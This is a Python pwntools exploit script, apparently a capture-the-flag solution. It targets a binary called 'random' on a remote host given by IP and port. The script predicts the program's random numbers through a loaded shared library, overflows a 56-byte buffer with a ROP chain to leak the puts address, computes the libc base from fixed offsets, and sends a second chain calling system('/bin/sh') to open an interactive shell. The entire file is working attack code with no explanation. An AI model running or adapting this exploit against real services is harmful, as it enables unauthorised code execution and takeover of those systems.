from pwn import *
import ctypes

context(os='linux',arch='amd64',log_level='debug')

lib = ctypes.CDLL('./1.so')

p = remote("47.100.245.185",32620)
#p = process('./random')
elf = ELF('./random')
libc = ELF('./libc.so.6')

lib.random_number.restype = ctypes.c_int

lib.set_seed()

p.sendafter("name.",b"aaaaaaaa")

i = 0
while i<=98:
	b = lib.random_number()  
	t = b % 100 + 1
	print("t = ",t)              
	p.sendafter(b'number:\n',p64(t))
	i += 1

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main_addr=0x40125D
pop_rdi_ret=0x401423
ret=0x40101a

payload = b'a'*56+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.sendafter("mind.\n",payload)



puts_addr=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))

#libc_base = puts_addr - libc.symbols['puts']
#system_addr = libc_base + libc.symbols['system']
#bin_addr = libc_base + next(libc.search(b'/bin/sh'))

libc_base = puts_addr - 0x084420
system_addr = libc_base + 0x052290
bin_addr = libc_base + 0x1B45BD

print("base = ",hex(libc_base))
print("sys = ",hex(system_addr))
print("bin = ",hex(bin_addr))

#gdb.attach(p)
payload=b'b'*56+p64(ret)+p64(pop_rdi_ret)+p64(bin_addr)+p64(system_addr)
p.send(payload)

p.interactive()